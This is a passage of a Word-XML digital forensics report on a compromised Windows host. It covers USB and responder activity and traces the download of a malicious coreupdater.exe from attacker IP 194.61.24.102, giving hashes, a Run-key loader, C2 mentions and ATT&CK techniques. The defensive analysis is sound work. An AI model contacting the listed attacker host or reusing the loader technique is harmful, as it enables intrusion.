        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>Quick Access interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened (RecentDocs)</w:t>
              <w:br/>
              <w:t>loot.zip</w:t>
              <w:br/>
              <w:t>lnk=loot.lnk mru=0 .zip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_RecentDocs.csv#14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:45:34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>file:///C:/Users/mortysmith/Documents/My%20Social%20Security%20Number.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD6765CD-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8</w:t>
              <w:br/>
              <w:t>Notepad My Social Security Number.txt {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\notepad.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-SDN1RPT_Activity_History_Report_20261025_191826.918732700.csv#30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\ProgramData\Microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-028: Removable media and responder activity: only USB device is the responder's SanDisk "Incident_drive" (E:, VSN A6125E71) browsed under ricksanchez 05:09–05:13; no exfiltration media</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artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:lnk files</w:t>
              <w:br/>
              <w:t>artifact:registry: recentdocs</w:t>
              <w:br/>
              <w:t>artifact:registry: usb</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2020-02-25 17:36:10 → 2020-09-19 05:13:21.865279</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>USB devices (raw.reg_usb):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only mass-storage device is VID_0781&amp;PID_5597, serial 4C530000261130109435 (SanDisk). It was first installed and last connected at 2020-09-19 05:08:58.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Everything else is virtual (VMware VID_0E0F, root hubs).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>LNK files in C:\Users\ricksanchez\...\Recent all point to volume serial A6125E71, removable drive type:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- "Incident_drive (E).lnk" → E:\.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- "DESKTOP-SDN1RPT.lnk" → E:\DESKTOP-SDN1RPT (target created 05:09:26).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- "Protected Files.lnk" → E:\DESKTOP-SDN1RPT\Protected Files (target created 05:13:18).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Other user artifacts:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Explorer jump list carries the same E: paths (05:13:21).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- RecentDocs: "Incident_drive (E:)" at 05:13:21.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShellBags: E:\FTK Imager and E:\DESKTOP-SDN1RPT at 05:09:48-05:13:13.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Windows Timeline: SnippingTool 05:09:10, msinfo32 05:09:13, E:\FTK Imager\FTK Imager.exe 05:09:58-05:18:11.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No LNK, jump list or ShellBag entry from the attacker session (03:36-03:52) references a removable or network volume. All attacker LNK targets are on the fixed volume with VSN B0E0E8FF. No Recycle Bin activity ($R/$I) appears in $J for the incident window.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The E: drive activity is the incident responder's live acquisition, which ran in the ricksanchez logon session (consistent with F-002). It is not attacker activity and is excluded. The "Protected Files" folder on E: is the responder's export of locked files (FTK Imager).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>There is no evidence of exfiltration to removable media. This does not exclude exfiltration over RDP or the C2 channel (see F-026). The responder's interactive logon as ricksanchez is also what fired the HKLM Run "coreupdate" loader at 05:08 (F-010). It is a side effect of the responder's actions, and it caused new attacker C2 traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (5)</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05:08:58.344277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USB: last connected</w:t>
              <w:br/>
              <w:t xml:space="preserve">USB Mass Storage Device serial=4C530000261130109435 Cruzer Glide 3.0 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USB.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-02-25 17:36:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>E:\</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=60:57:18:83:4f:f1 volume=A6125E71 Removable storage media (Floppy, USB) size=4096</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\Incident_drive (E).lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>E:\DESKTOP-SDN1RPT\Protected Files</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=A6125E71 Removable storage media (Floppy, USB) size=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\Protected Files.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.500197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>E:\DESKTOP-SDN1RPT\Protected Files</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:21.865279</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened (RecentDocs) ; Last opened for the extension</w:t>
              <w:br/>
              <w:t>Incident_drive (E:)</w:t>
              <w:br/>
              <w:t>lnk=Incident_drive (E).lnk mru=0 RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_RecentDocs.csv#44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.10 Web browsing, downloads and e-mail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Step 10 (web browsing, downloads and e-mail) is done. No browser-history tables were parsed: there is no Chromium, Firefox, Hindsight or IE/WebCache output, and the legacy Edge spartan.edb/WebCache files were not processed. I rebuilt the web activity from the Windows Timeline, SIDR activity history, Suricata HTTP/TLS/fileinfo, $UsnJrnl, $MFT Zone.Identifier ADS (disk and memory vol_ads), OpenSavePidlMRU and TypedURLs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>New finding F-029 (high, confirmed: pcap + disk + Windows Timeline) traces where coreupdater.exe came from:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- C137\Administrator opened legacy Edge (EdgeHTML 18.19041, first run for this profile) and went straight to http://194.61.24.102/, a 228-byte directory listing. The request had no Referer, so the URL was typed or pasted.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Edge then fetched /coreupdater.exe (SHA256 10f3b920…, 7168 bytes) with that page as Referer.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Disk trace of the download: cache copy coreupdater[1].exe at 03:39:57; Save-As as Downloads\coreupdater.exe.b1jhvkh.partial (MFT 26213) with the Zone.Identifier ADS written at 03:40:00.864, then renamed to coreupdater.exe; moved to System32 at 03:40:42.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Zone.Identifier stream was removed (USN StreamChange) at 03:40:49.317. That is the moment the file ran, and it matches the SmartScreen checkappexec TLS connection in the capture. The most likely explanation is that the user clicked through the SmartScreen/security warning; a manual unblock is the less likely alternative. The ADS is absent from $MFT at acquisition.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The attacker server delivered only two objects to this host: the "/" listing and coreupdater.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Also recorded: timeline event T-023 and IOC I-015 (http://194.61.24.102/). The noise note covers:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- mortysmith's benign Bing image browsing on 2020-09-18 around 23:00, which produced Jessica.jpg and Portal_gun.png (Portal_gun.png was later taken by the attacker).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Edge backup MOTW files.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- autorunsc entries found in memory that reference a "James" profile, which has no matching $MFT entry and is not attacker activity.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No e-mail stores exist on the host, so e-mail as the delivery route is ruled out.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-029: Download provenance of coreupdater.exe: typed navigation to http://194.61.24.102/ in legacy Edge, Save-As to Downloads with Mark-of-the-Web, MOTW stream removed at first execution after SmartScreen check</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artifact:registry: opensavepidlmru</w:t>
              <w:br/>
              <w:t>artifact:windows search (activity history)</w:t>
              <w:br/>
              <w:t>artifact:windows timeline (activitiescache)</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>initial access / execution (ingress tool transfer)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1204.002, T1553.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:05.286189 → 2020-09-19 03:40:49.317328</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Facts (host UTC; pcap clock ≈ host −1 h, see F-011):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Windows Timeline / SIDR activity: Administrator, Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge "Directory listing for /" http://194.61.24.102/ start 03:39:29, end 03:44:52.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Suricata HTTP (UA "Mozilla/5.0 ... Edge/18.19041", legacy EdgeHTML): 10.42.85.115 GET http://194.61.24.102/ (200, no Referer → typed/pasted URL, eve_http#153, pcap 02:39:26 ≈ host 03:39:26); body 228 bytes (fileinfo#137, SHA256 6978f8fa...). Then GET /coreupdater.exe (200, Referer http://194.61.24.102/, eve_http#156, pcap 02:39:58); fileinfo#138 SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6, 7168 bytes.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $UsnJrnl: Edge INetCache file ...\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe (MFT 24493) created 03:39:57.907; Save-As: Downloads\coreupdater.exe.b1jhvkh.partial (MFT 26213) created 03:40:00.848, NamedDataExtend/StreamChange at 03:40:00.864 (Zone.Identifier ADS written), renamed coreupdater.exe 03:40:00.864; cache copy deleted 03:40:00.848. OpenSavePidlMRU (exe and *): "This PC\Downloads\coreupdater.exe" 03:40:00.69.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Same MFT 26213 renamed to .\Windows\System32\coreupdater.exe 03:40:42.254, then StreamChange at 03:40:49.317/.333 = execution time (Prefetch). Current $MFT row for coreupdater.exe: HasAds=False, no ZoneIdContents → the Zone.Identifier stream no longer exists.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Suricata TLS: nav.smartscreen.microsoft.com at pcap 02:39:04/02:39:27/02:40:01 (Edge SmartScreen URL/download reputation) and checkappexec.microsoft.com at pcap 02:40:45 and 02:40:49.94 (Windows SmartScreen app-reputation check at launch of a MOTW file).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No other file was downloaded by the host from 194.61.24.102 (fileinfo shows only "/" and "/coreupdater.exe"). No other Edge HTTP downloads of executables/scripts in the capture; other Edge traffic of 10.42.85.115 is benign browsing (Bing image results for "Jessica" Rick&amp;Morty on 2020-09-18 ~23:00 host, by mortysmith → Pictures\Jessica.jpg 23:01:11 and Documents\Portal_gun.png 23:07:44, both with Edge Zone.Identifier ZoneId=3, no HostUrl).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
